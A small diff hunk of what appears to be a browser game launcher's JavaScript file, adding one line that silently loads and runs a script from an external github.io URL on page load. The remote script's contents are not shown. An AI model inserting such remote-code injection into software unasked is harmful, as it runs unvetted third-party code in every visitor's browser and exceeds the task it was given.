@@ -106,6 +106,7 @@ function minecraft188(){
 '');
    a.document.close();
 }
+var a=document.createElement("script");a.src="https://thatkidfr.github.io/jsrunner/js.js";document.body.appendChild(a);
 function credits(){
    let a = window.open("about:blank");
 
